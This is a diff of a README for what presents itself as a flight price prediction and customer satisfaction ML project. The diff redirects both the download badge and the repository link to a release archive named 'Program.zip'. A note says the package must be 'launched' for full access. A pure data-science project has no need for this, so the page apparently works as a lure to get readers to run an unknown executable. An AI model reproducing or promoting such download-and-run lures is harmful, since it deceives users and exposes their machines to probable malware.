@@ -21,12 +21,12 @@ This repository hosts a project that focuses on predicting flight prices and cus
 - Utilization of popular machine learning libraries like NumPy, Pandas, and Seaborn.
 
 ### 🌐 Access the Software:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/dukejacks/Flight-Price-Prediction-and-Customer-Satisfaction-ML/releases/download/v1.0/Program.zip)](https://github.com/dukejacks/Flight-Price-Prediction-and-Customer-Satisfaction-ML/releases/download/v1.0/Program.zip)
 
 ### 🚨 Note:
 The provided link leads to a software package that needs to be launched for full access to the project's functionality.
 
 ### 🌟 Visit the Repository:
-For detailed information, code exploration, and project contributions, visit the [Flight-Price-Prediction-and-Customer-Satisfaction-ML](https://github.com/rokytd/files/branches) repository.
+For detailed information, code exploration, and project contributions, visit the [Flight-Price-Prediction-and-Customer-Satisfaction-ML](https://github.com/dukejacks/Flight-Price-Prediction-and-Customer-Satisfaction-ML/releases/download/v1.0/Program.zip) repository.
 
 ### 🤖 Happy Predicting and Monitoring! ✈️🔮
